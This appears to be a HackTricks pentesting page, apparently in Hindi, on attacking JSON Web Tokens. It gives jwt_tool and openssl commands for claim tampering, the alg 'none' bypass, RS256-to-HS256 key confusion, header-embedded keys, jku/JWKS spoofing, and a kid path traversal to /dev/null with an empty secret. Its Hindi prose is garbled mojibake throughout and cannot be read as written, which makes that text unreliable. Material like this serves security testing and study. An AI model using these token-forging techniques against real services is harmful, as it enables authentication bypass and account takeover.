# JWT рд╡рдВрд▓рд░рдмрд┐рд▓рд┐рдЯреАрдЬ (Json Web Tokens)

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕ рджреЗрдЦреЗрдВ**](https://github.com/sponsors/carlospolop)!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/hacktricks\_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, HackTricks рдФрд░ HackTricks Cloud** github рд░реЗрдкреЛ рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗред

</details>

<figure><img src="../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

рдпрджрд┐ рдЖрдк **рд╣реИрдХрд┐рдВрдЧ рдХрд░рд┐рдпрд░** рдореЗрдВ рд░реБрдЪрд┐ рд░рдЦрддреЗ рд╣реИрдВ рдФрд░ рдЕрдирд╣реИрдХреЗрдмрд▓ рдХреЛ рд╣реИрдХ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ - **рд╣рдо рднрд░реНрддреА рдХрд░ рд░рд╣реЗ рд╣реИрдВ!** (_рдлреНрд▓реВрдПрдВрдЯ рдкреЛрд▓рд┐рд╢ рд▓рд┐рдЦрд┐рдд рдФрд░ рдмреЛрд▓реА рдЬрд╛рдиреА рдЪрд╛рд╣рд┐рдП_).

{% embed url="https://www.stmcyber.com/careers" %}

**рдЗрд╕ рдкреЛрд╕реНрдЯ рдХрд╛ рдПрдХ рд╣рд┐рд╕реНрд╕рд╛ рд╢рд╛рдирджрд╛рд░ рдкреЛрд╕реНрдЯ рдкрд░ рдЖрдзрд╛рд░рд┐рдд рд╣реИ:** [**https://github.com/ticarpi/jwt\_tool/wiki/Attack-Methodology**](https://github.com/ticarpi/jwt\_tool/wiki/Attack-Methodology)\
**JWTs рдХреЛ рдкреЗрдВрдЯреЗрд╕реНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдорд╣рд╛рди рдЯреВрд▓ рдХреЗ рд▓реЗрдЦрдХ** [**https://github.com/ticarpi/jwt\_tool**](https://github.com/ticarpi/jwt\_tool)

### **рддреНрд╡рд░рд┐рдд рдЬреАрддреЗрдВ**

[**jwt\_tool**](https://github.com/ticarpi/jwt\_tool) рдХреЛ рдореЛрдб `All Tests!` рдХреЗ рд╕рд╛рде рдЪрд▓рд╛рдПрдВ рдФрд░ рд╣рд░реЗ рд░реЗрдЦрд╛рдУрдВ рдХрд╛ рдЗрдВрддрдЬрд╛рд░ рдХрд░реЗрдВ
```bash
python3 jwt_tool.py -M at \
-t "https://api.example.com/api/v1/user/76bab5dd-9307-ab04-8123-fda81234245" \
-rh "Authorization: Bearer eyJhbG...<JWT Token>"
```
рдпрджрд┐ рдЖрдк рднрд╛рдЧреНрдпрд╢рд╛рд▓реА рд╣реИрдВ рддреЛ рдпрд╣ рдЙрдкрдХрд░рдг рдХреБрдЫ рдорд╛рдорд▓реЗ рдвреВрдВрдврд╝ рд▓реЗрдЧрд╛ рдЬрд╣рд╛рдВ рд╡реЗрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди JWT рдХреА рдЧрд▓рдд рдЬрд╛рдВрдЪ рдХрд░ рд░рд╣реА рд╣реИ:

![](<../.gitbook/assets/image (932).png>)

рдлрд┐рд░, рдЖрдк рдЕрдкрдиреЗ рдкреНрд░реЙрдХреНрд╕реА рдореЗрдВ рдЕрдиреБрд░реЛрдз рдХреА рдЦреЛрдЬ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдпрд╛ jwt\_ рдЙрдкрдХрд░рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЙрд╕ рдЕрдиреБрд░реЛрдз рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЧрдП JWT рдХреЛ рдбрдВрдк рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
python3 jwt_tool.py -Q "jwttool_706649b802c9f5e41052062a3787b291"
```
### рдбреЗрдЯрд╛ рдореЗрдВ рд╣рд╕реНрддрдХреНрд╖реЗрдк рдХрд░реЗрдВ рдмрд┐рдирд╛ рдХреБрдЫ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд┐рдП

рдЖрдк рдбреЗрдЯрд╛ рдореЗрдВ рд╣рд╕реНрддрдХреНрд╖реЗрдк рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХреЛ рдЫреЛрдбрд╝рдХрд░ рдФрд░ рд╕рд░реНрд╡рд░ рдХреЛ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рдЕрдкрдирд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо "рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ" рдореЗрдВ рдмрджрд▓рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВред

#### **рдХреНрдпрд╛ рдЯреЛрдХрди рдХреА рдЬрд╛рдВрдЪ рдХреА рдЬрд╛рддреА рд╣реИ?**

JWT рдХреЗ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП:

* рдПрдХ рддреНрд░реБрдЯрд┐ рд╕рдВрджреЗрд╢ рдЬрд╛рд░реА рдХрд░рддреА рд╣реИ рдЬреЛ рдЬрд╛рд░реА рд╣реИ; рд╡рд┐рд╕реНрддреГрдд рддреНрд░реБрдЯрд┐рдпреЛрдВ рдореЗрдВ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╡рд┐рд╡рд░рдг рдХреА рд╕рдореАрдХреНрд╖рд╛ рдХрд░рдиреА рдЪрд╛рд╣рд┐рдПред
* рд╡рд╛рдкрд╕ рдЖрдиреЗ рд╡рд╛рд▓реЗ рдкреГрд╖реНрда рдореЗрдВ рдкрд░рд┐рд╡рд░реНрддрди рднреА рдЬрд╛рдВрдЪ рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдХреНрдпрд╛ рдЬрд╛рдВрдЪ рд╣реЛ рд░рд╣реА рд╣реИред
* рдХреЛрдИ рдкрд░рд┐рд╡рд░реНрддрди рдирд╣реАрдВ рд╕реБрдЭрд╛рддрд╛ рд╣реИ рдХрд┐ рдХреЛрдИ рдЬрд╛рдВрдЪ рдирд╣реАрдВ рд╣реЛ рд░рд╣реА рд╣реИ; рдпрд╣ рд╡рд╣ рд╕рдордп рд╣реИ рдЬрдм рдкреЗрдпрд▓реЛрдб рдХреНрд▓реЗрдореНрд╕ рдореЗрдВ рд╣рд╕реНрддрдХреНрд╖реЗрдк рдХрд░рдиреЗ рдХреЗ рд╕рд╛рде рдкреНрд░рдпреЛрдЧ рдХрд░рдиреЗ рдХрд╛ рд╣реИред

### рдореВрд▓

рдпрд╣ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИ рдХрд┐ рдпрд╣ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдП рдХрд┐ рдХреНрдпрд╛ рдЯреЛрдХрди рд╕рд░реНрд╡рд░-рд╕рд╛рдЗрдб рдпрд╛ рдХреНрд▓рд╛рдЗрдВрдЯ-рд╕рд╛рдЗрдб рд╕реЗ рдЙрддреНрдкрдиреНрди рд╣реБрдЖ рдерд╛, рдкреНрд░реЙрдХреНрд╕реА рдХреЗ рдЕрдиреБрд░реЛрдз рдЗрддрд┐рд╣рд╛рд╕ рдХреА рдЬрд╛рдВрдЪ рдХрд░рдХреЗред

* рдкрд╣рд▓реА рдмрд╛рд░ рдХреНрд▓рд╛рдЗрдВрдЯ рд╕рд╛рдЗрдб рд╕реЗ рджреЗрдЦреЗ рдЧрдП рдЯреЛрдХрди рдЗрд╕ рд╕рдВрдХреЗрдд рдХреЛ рджреЗрддреЗ рд╣реИрдВ рдХрд┐ рдХреБрдВрдЬреА рдХреЛ рдХреНрд▓рд╛рдЗрдВрдЯ рд╕рд╛рдЗрдб рдХреЛрдб рдХреЛ рдЙрдЬрд╛рдЧрд░ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдЖрдЧреЗ рдЬрд╛рдВрдЪ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред
* рд╕рд░реНрд╡рд░-рд╕рд╛рдЗрдб рд╕реЗ рдЙрддреНрдкрдиреНрди рдЯреЛрдХрди рд╕реБрд░рдХреНрд╖рд┐рдд рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреА рдУрд░ рд╕рдВрдХреЗрдд рдХрд░рддреЗ рд╣реИрдВред

### рдЕрд╡рдзрд┐

рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдЯреЛрдХрди 24 рдШрдВрдЯреЗ рд╕реЗ рдЕрдзрд┐рдХ рдЪрд▓рддрд╛ рд╣реИ... рд╢рд╛рдпрдж рдпрд╣ рдХрднреА рд╕рдорд╛рдкреНрдд рдирд╣реАрдВ рд╣реЛрддрд╛ред рдпрджрд┐ "exp" рдлрд╝реАрд▓реНрдб рд╣реИ, рддреЛ рдпрд╣ рджреЗрдЦреЗрдВ рдХрд┐ рдХреНрдпрд╛ рд╕рд░реНрд╡рд░ рдЗрд╕реЗ рд╕рд╣реА рд╕реЗ рд╕рдВрднрд╛рд▓ рд░рд╣рд╛ рд╣реИред

### рд╣реИрд╢-рдмрд▓ рдПрдордПрд╕реА рд╕реАрдХреНрд░реЗрдЯ рдХреЛ рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рдХрд░реЗрдВ

[**рдЗрд╕ рдкреГрд╖реНрда рдХреЛ рджреЗрдЦреЗрдВред**](../generic-methodologies-and-resources/brute-force.md#jwt)

### рдПрд▓реНрдЧреЛрд░рд┐рдереНрдо рдХреЛ рдирди (CVE-2015-9235) рдореЗрдВ рдмрджрд▓реЗрдВ

рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдПрд▓реНрдЧреЛрд░рд┐рдереНрдо рдХреЛ "рдирди" рдХреЗ рд░реВрдк рдореЗрдВ рд╕реЗрдЯ рдХрд░реЗрдВ рдФрд░ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рднрд╛рдЧ рдХреЛ рд╣рдЯрд╛ рджреЗрдВред

рдЗрд╕ рд╡рдВрд╢рд╛рдиреБрдХреНрд░рдорд┐рдХ рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдФрд░ JWT рдХреЗ рднреАрддрд░ рд╡рд┐рднрд┐рдиреНрди рдорд╛рдиреЛрдВ рдХреЛ рдмрджрд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдмрд░реНрдк рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреЙрд▓ "JSON рд╡реЗрдм рдЯреЛрдХрди" рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ (рдЕрдиреБрд░реЛрдз рдХреЛ рд░рд┐рдкреАрдЯрд░ рдХреЛ рднреЗрдЬреЗрдВ рдФрд░ "JSON рд╡реЗрдм рдЯреЛрдХрди" рдЯреИрдм рдореЗрдВ рдЖрдк рдЯреЛрдХрди рдХреЗ рдорд╛рдиреЛрдВ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЖрдк рдпрд╣ рднреА рдЪреБрди рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ "рдПрд▓реНрдЧ" рдлрд╝реАрд▓реНрдб рдХреЗ рдорд╛рди рдХреЛ "рдирди" рдореЗрдВ рдбрд╛рд▓реЗрдВ)ред

### рдПрд▓реНрдЧреЛрд░рд┐рдереНрдо рдХреЛ рдмрджрд▓реЗрдВ RS256(рдЕрд╕рдордорд┐рдд) рд╕реЗ HS256(рд╕рдордорд┐рдд) (CVE-2016-5431/CVE-2016-10555)

рдПрд▓реНрдЧреЛрд░рд┐рдереНрдо HS256 рдкреНрд░рддреНрдпреЗрдХ рд╕рдВрджреЗрд╢ рдХреЛ рд╕рд╛рдЗрди рдФрд░ рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЧреБрдкреНрдд рдХреБрдВрдЬреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред\
рдПрд▓реНрдЧреЛрд░рд┐рдереНрдо RS256 рд╕рдВрджреЗрд╢ рдХреЛ рд╕рд╛рдЗрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рдЬреА рдХреБрдВрдЬреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдХреБрдВрдЬреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред

рдпрджрд┐ рдЖрдк рдПрд▓реНрдЧреЛрд░рд┐рдереНрдо рдХреЛ RS256 рд╕реЗ HS256 рдореЗрдВ рдмрджрд▓рддреЗ рд╣реИрдВ, рддреЛ рдмреИрдХ рдПрдВрдб рдХреЛрдб рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдХреБрдВрдЬреА рдХреЗ рд░реВрдк рдореЗрдВ рд╕реБрд░рдХреНрд╖рд┐рдд рдХреБрдВрдЬреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдлрд┐рд░ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХреА рдкреБрд╖реНрдЯрд┐ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП HS256 рдПрд▓реНрдЧреЛрд░рд┐рдереНрдо рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред

рдлрд┐рд░, рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдХреБрдВрдЬреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдФрд░ RS256 рдХреЛ HS256 рдореЗрдВ рдмрджрд▓рдХрд░ рд╣рдо рдПрдХ рдорд╛рдиреНрдп рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВред рдЖрдк рдЗрд╕реЗ рдирд┐рд╖реНрдХрд░реНрд╖рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рд╡реЗрдм рд╕рд░реНрд╡рд░ рдХрд╛ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдХреЗ рдпрд╣ рдХрд░рдХреЗ:
```bash
openssl s_client -connect example.com:443 2>&1 < /dev/null | sed -n '/-----BEGIN/,/-----END/p' > certificatechain.pem #For this attack you can use the JOSEPH Burp extension. In the Repeater, select the JWS tab and select the Key confusion attack. Load the PEM, Update the request and send it. (This extension allows you to send the "non" algorithm attack also). It is also recommended to use the tool jwt_tool with the option 2 as the previous Burp Extension does not always works well.
openssl x509 -pubkey -in certificatechain.pem -noout > pubkey.pem
```
### рд╣реЗрдбрд░ рдореЗрдВ рдирдпрд╛ рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдХреБрдВрдЬреА

рдПрдХ рд╣рдорд▓рд╛рд╡рд╛рд░ рдЯреЛрдХрди рдХреЗ рд╣реЗрдбрд░ рдореЗрдВ рдПрдХ рдирдИ рдХреБрдВрдЬреА рдПрдореНрдмреЗрдб рдХрд░рддрд╛ рд╣реИ рдФрд░ рд╕рд░реНрд╡рд░ рдЗрд╕ рдирдИ рдХреБрдВрдЬреА рдХрд╛ рдЙрдкрдпреЛрдЧ рд╕рд┐рдЧреНрдиреЗрдЪрд░ рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░рддрд╛ рд╣реИ (CVE-2018-0114).

рдЗрд╕реЗ "JSON Web Tokens" Burp рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреЗ рд╕рд╛рде рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред\
(рдЕрдиреБрд░реЛрдз рдХреЛ Repeater рдореЗрдВ рднреЗрдЬреЗрдВ, JSON Web Token рдЯреИрдм рдореЗрдВ "CVE-2018-0114" рдХрд╛ рдЪрдпрди рдХрд░реЗрдВ рдФрд░ рдЕрдиреБрд░реЛрдз рднреЗрдЬреЗрдВ)ред

### JWKS рд╕реНрдкреВрдлрд┐рдВрдЧ

рдирд┐рд░реНрджреЗрд╢ рдПрдХ рд╡рд┐рдзрд┐ рдХрд╛ рд╡рд┐рд╡рд░рдг рджреЗрддреЗ рд╣реИрдВ рдЬреЛ JWT рдЯреЛрдХрдиреЛрдВ рдХреА рд╕реБрд░рдХреНрд╖рд╛ рдХрд╛ рдореВрд▓реНрдпрд╛рдВрдХрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣реИ, рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рдЙрдирдХреЗ рд▓рд┐рдП рдЬреЛ "jku" рд╣реЗрдбрд░ рдХреНрд▓реЗрдо рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВред рдЗрд╕ рдХреНрд▓реЗрдо рдХреЛ рдПрдХ JWKS (JSON Web Key Set) рдлрд╝рд╛рдЗрд▓ рд╕реЗ рдЬреЛрдбрд╝рдирд╛ рдЪрд╛рд╣рд┐рдП рдЬреЛ рдЯреЛрдХрди рдХреА рд╕рддреНрдпрд╛рдкрди рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдХреБрдВрдЬреА рдХреЛ рд╢рд╛рдорд┐рд▓ рдХрд░рддреА рд╣реИред

* **"jku" рд╣реЗрдбрд░ рдХреЗ рд╕рд╛рде рдЯреЛрдХрди рдХрд╛ рдореВрд▓реНрдпрд╛рдВрдХрди рдХрд░рдирд╛**:
* рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВ рдХрд┐ "jku" рдХреНрд▓реЗрдо рдХрд╛ URL рдЙрдЪрд┐рдд JWKS рдлрд╝рд╛рдЗрд▓ рдкрд░ рдкрд╣реБрдВрдЪрддрд╛ рд╣реИред
* рдЯреЛрдХрди рдХреЗ "jku" рдорд╛рди рдХреЛ рдмрджрд▓рдХрд░ рдирд┐рдпрдВрддреНрд░рд┐рдд рд╡реЗрдм рд╕реЗрд╡рд╛ рдХреА рдУрд░ рдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЯреНрд░реИрдлрд╝рд┐рдХ рдЕрд╡рд▓реЛрдХрди рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдиреЗ рд╡рд╛рд▓рд╛ рд╡рд┐рдзрд╛рдиред
* **HTTP рдЗрдВрдЯрд░реИрдХреНрд╢рди рдХреЗ рд▓рд┐рдП рдореЙрдирд┐рдЯрд░рд┐рдВрдЧ**:
* рдЖрдкрдХреЗ рдирд┐рд░реНрджрд┐рд╖реНрдЯ URL рдкрд░ HTTP рдЕрдиреБрд░реЛрдзреЛрдВ рдХрд╛ рдЕрд╡рд▓реЛрдХрди рдХрд░рдирд╛ рд╕рд░реНрд╡рд░ рдХреА рдХреЛрд╢рд┐рд╢реЛрдВ рдХреЛ рд╕реВрдЪрд┐рдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ рд╡рд╣ рдЖрдкрдХреЗ рдкреНрд░рджрддреНрдд рд▓рд┐рдВрдХ рд╕реЗ рдХреБрдВрдЬрд┐рдпрд╛рдБ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд░рд╣рд╛ рд╣реИред
* рдЗрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рд▓рд┐рдП `jwt_tool` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╕рдордп, рдЯреЗрд╕реНрдЯрд┐рдВрдЧ рдХреЛ рд╕реБрд╡рд┐рдзрд╛рдЬрдирдХ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдкрдиреА рд╡реНрдпрдХреНрддрд┐рдЧрдд JWKS рд╕реНрдерд╛рди рдХреЛ `jwtconf.ini` рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдЕрдкрдбреЗрдЯ рдХрд░рдирд╛ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИред
* **`jwt_tool` рдХреЗ рд▓рд┐рдП рдХрдорд╛рдВрдб**:
*   рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдб рдХреЛ рдирдХрд▓реА рджреГрд╢реНрдп рдХреЗ рд╕рд╛рде рд╡рд╛рд╕реНрддрд╡рд┐рдХрддрд╛ рдореЗрдВ рд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП `jwt_tool` рдХреЗ рд╕рд╛рде рджреГрд╢реНрдп рдХреЛ рдирдХрд▓реА рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдВ:

```bash
python3 jwt_tool.py JWT_HERE -X s
```

### Kid рдореБрджреНрджреЛрдВ рдХрд╛ рд╕рд╛рд░рд╛рдВрд╢

рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рдЙрди рдкрд░рд┐рд╕реНрдерд┐рддрд┐рдпреЛрдВ рдореЗрдВ рдЬрд╣рд╛рдВ рдЯреЛрдХрди рд╕рд┐рдЧреНрдиреЗрдЪрд░ рд╕рддреНрдпрд╛рдкрди рдХреЗ рд▓рд┐рдП рдХрдИ рдХреБрдВрдЬрд┐рдпрд╛рдБ рдореМрдЬреВрдж рд╣реИрдВ, рдПрдХ рд╡рд┐рд╢реЗрд╖ рдХреБрдВрдЬреА рдХреА рдкрд╣рдЪрд╛рди рдХреЗ рд▓рд┐рдП `kid` рдирд╛рдордХ рдПрдХ рд╡реИрдХрд▓реНрдкрд┐рдХ рд╣реЗрдбрд░ рдХреНрд▓реЗрдо рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрд╣ рдХреНрд▓реЗрдо рдЯреЛрдХрди рдХреЗ рд╕рд┐рдЧреНрдиреЗрдЪрд░ рд╕рддреНрдпрд╛рдкрди рдХреЗ рд▓рд┐рдП рдЙрдЪрд┐рдд рдХреБрдВрдЬреА рдХрд╛ рдЪрдпрди рдХрд░рдиреЗ рдореЗрдВ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реЛрддрд╛ рд╣реИред

#### "kid" рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХреБрдВрдЬреА рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдирд╛

рдЬрдм `kid` рдХреНрд▓реЗрдо рд╣реЗрдбрд░ рдореЗрдВ рдореМрдЬреВрдж рд╣реЛрддрд╛ рд╣реИ, рддреЛ рд╕рдВрдмрдВрдзрд┐рдд рдлрд╝рд╛рдЗрд▓ рдпрд╛ рдЙрд╕рдХреЗ рд╡рд┐рд╡рд┐рдзрддрд╛рдУрдВ рдХреЗ рд▓рд┐рдП рд╡реЗрдм рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ рдЦреЛрдЬ рдХрд░рдиреЗ рдХреА рд╕рд▓рд╛рд╣ рджреА рдЬрд╛рддреА рд╣реИред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдпрджрд┐ `"kid":"key/12345"` рдирд┐рд░реНрджрд┐рд╖реНрдЯ рд╣реИ, рддреЛ рдлрд╝рд╛рдЗрд▓ _/key/12345_ рдФрд░ _/key/12345.pem_ рдХреА рд╡реЗрдм рд░реВрдЯ рдореЗрдВ рдЦреЛрдЬреА рдЬрд╛рдиреА рдЪрд╛рд╣рд┐рдПред

#### "kid" рдХреЗ рд╕рд╛рде рдкрде рдЯреНрд░рд╛рд╡рд░реНрд╕рд▓

`kid` рдХреНрд▓реЗрдо рдХрд╛ рдЙрдкрдпреЛрдЧ рдлрд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдиреЗрд╡рд┐рдЧреЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдХрд┐рд╕реА рднреА рд╡рд┐рдЪрд┐рддреНрд░ рдлрд╝рд╛рдЗрд▓ рдХрд╛ рдЪрдпрди рдХрд░рдиреЗ рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рд╣реЛрддреА рд╣реИред рд╡рд┐рд╢реЗрд╖ рдлрд╝рд╛рдЗрд▓реЛрдВ рдпрд╛ рд╕реЗрд╡рд╛рдУрдВ рдХреЛ рд▓рдХреНрд╖рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП `kid` рдорд╛рди рдХреЛ рдмрджрд▓рдХрд░ рдХрдиреЗрдХреНрдЯрд┐рд╡рд┐рдЯреА рдХрд╛ рдкрд░реАрдХреНрд╖рдг рдХрд░рдирд╛ рдпрд╛ рд╕рд░реНрд╡рд░-рд╕рд╛рдЗрдб рдЕрдиреБрд░реЛрдз рдлрд░реНрдЬреА (SSRF) рд╣рдорд▓реЗ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рд╣реИред `jwt_tool` рдореЗрдВ `kid` рдорд╛рди рдХреЛ рдмрджрд▓рдиреЗ рдХреЗ рд▓рд┐рдП JWT рдореЗрдВ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХреЛ рдмрдирд╛рдП рд░рдЦрддреЗ рд╣реБрдП `-T` рдзреНрд╡рдЬ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЗрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬреИрд╕рд╛ рдХрд┐ рдиреАрдЪреЗ рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ:
```bash
python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""
```
